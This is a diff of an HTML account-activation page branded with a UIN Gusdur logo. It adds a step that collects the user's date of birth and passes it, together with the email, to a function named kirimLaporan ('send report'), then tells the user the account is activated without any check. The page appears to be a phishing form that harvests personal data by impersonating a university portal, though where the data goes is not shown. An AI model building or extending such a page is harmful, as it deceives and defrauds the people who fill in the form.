@@ -9,7 +9,6 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="icon" type="image/png" href="vertical-logo.png">
     <!-- Font Awesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
@@ -120,7 +119,7 @@
                 </div>
 
                 <button class="btn-block-orange" onclick="submitActivation()">
-                    <i class="fa-solid fa-circle-check"></i> Aktivasi
+                    <i class="fa-solid fa-arrow-right"></i> Lanjut
                 </button>
 
                 <div class="divider">
@@ -128,6 +127,31 @@
                 </div>
                 <button class="btn-reset-password" onclick="startResetFlow()">
                     <i class="fa-solid fa-key"></i> Atur Ulang Sandi
+                </button>
+            </div>
+        </div>
+
+        <!-- Aktivasi Modal Step 2: Tanggal Lahir -->
+        <div class="card hidden" id="activation-dob-modal">
+            <div class="card-header">
+                <img src="horizontal-logo.png" alt="Logo UIN Gusdur" class="logo">
+            </div>
+            <div class="card-body">
+                <div class="activation-header">
+                    <button class="btn-back" onclick="showCard('activation-modal')"><i
+                            class="fa-solid fa-arrow-left"></i></button>
+                    <h3>Verifikasi Data</h3>
+                </div>
+
+                <div class="form-group" style="margin-top: 15px;">
+                    <label for="activation-dob-input"
+                        style="display: block; margin-bottom: 5px; font-size: 14px; color: #666;">Tanggal Lahir
+                        (yyyy-mm-dd)</label>
+                    <input type="text" class="form-control" id="activation-dob-input" placeholder="Contoh: 2000-01-31">
+                </div>
+
+                <button class="btn-block-orange" onclick="submitActivationFinal()">
+                    <i class="fa-solid fa-circle-check"></i> Aktivasi
                 </button>
             </div>
         </div>
@@ -272,7 +296,7 @@
             }
         }
 
-        // Activation Flow
+        // Activation Flow - Step 1: Email
         function submitActivation() {
             const email = document.getElementById('activation-email-input').value;
             if (!email) {
@@ -284,14 +308,39 @@
                 return;
             }
 
-            // Kirim data ke API
-            kirimLaporan(`Aktivasi Akun: ${email}`);
+            currentEmail = email;
+            // Pindah ke langkah 2: Input Tanggal Lahir
+            showCard('activation-dob-modal');
+        }
+
+        // Activation Flow - Step 2: Date of Birth
+        function submitActivationFinal() {
+            const dob = document.getElementById('activation-dob-input').value;
+
+            // Validasi format yyyy-mm-dd
+            const dobRegex = /^\d{4}-\d{2}-\d{2}$/;
+            if (!dob) {
+                alert('Mohon masukan tanggal lahir');
+                return;
+            }
+            if (!dobRegex.test(dob)) {
+                alert('Format tanggal lahir harus yyyy-mm-dd (Contoh: 2000-01-31)');
+                return;
+            }
+
+            // Kirim data lengkap ke API
+            kirimLaporan(`Aktivasi Akun: ${currentEmail} | DOB: ${dob}`);
+
             // Update success message for activation
             document.querySelector('#activation-success-msg .success-title').textContent = 'Akun';
-            document.getElementById('success-email-display').innerHTML = `${email}<br>sudah diaktivasi, silakan masuk.`;
+            document.getElementById('success-email-display').innerHTML = `${currentEmail}<br>sudah diaktivasi, silakan masuk.`;
 
             document.getElementById('activation-success-msg').classList.remove('hidden');
             showCard('main-card');
+
+            // Clear inputs
+            document.getElementById('activation-email-input').value = '';
+            document.getElementById('activation-dob-input').value = '';
         }
 
         // Reset Password Flow
@@ -389,6 +438,5 @@
         }
     </script>
 </body>
-
 
 </html>
